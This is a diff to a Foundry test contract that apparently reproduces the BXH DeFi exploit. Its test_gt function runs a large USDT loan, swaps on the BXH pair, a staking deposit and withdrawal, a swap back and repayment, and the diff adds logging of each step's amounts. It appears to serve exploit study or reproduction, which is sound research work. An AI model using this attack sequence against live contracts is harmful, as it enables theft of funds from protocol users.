@@ -220,22 +220,36 @@ contract BXHTestBase is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 3110000e18);
         borrow_usdt_owner(3110000e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", 3110000e18);
+        emit log_named_uint(
+            "amt2",
+            pair.getAmountOut(3110000e18, address(usdt))
+        );
         swap_pair_attacker_usdt_bxh(
             3110000e18,
             pair.getAmountOut(3110000e18, address(usdt))
         );
         printBalance("After step1 ");
+        emit log_named_uint("amt3", 5582e18);
         deposit_bxhstaking_bxh_bxhslp(5582e18);
         printBalance("After step2 ");
+        emit log_named_uint("amt4", 0);
         withdraw_bxhstaking_bxhslp_usdt(0);
         printBalance("After step3 ");
+        emit log_named_uint("amt5", bxh.balanceOf(attacker));
+        emit log_named_uint(
+            "amt6",
+            pair.getAmountOut(bxh.balanceOf(attacker), address(bxh))
+        );
         swap_pair_attacker_bxh_usdt(
             bxh.balanceOf(attacker),
             pair.getAmountOut(bxh.balanceOf(attacker), address(bxh))
         );
         printBalance("After step4 ");
+        emit log_named_uint("amt7", (3110000e18 * 1003) / 1000);
         payback_usdt_owner((3110000e18 * 1003) / 1000);
         printBalance("After step5 ");
         require(attackGoal(), "Attack failed!");
@@ -260,7 +274,7 @@ contract BXHTestBase is Test, BlockLoader {
         withdraw_bxhstaking_bxhslp_usdt(amt4);
         swap_pair_attacker_bxh_usdt(amt5, amt6);
         payback_usdt_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
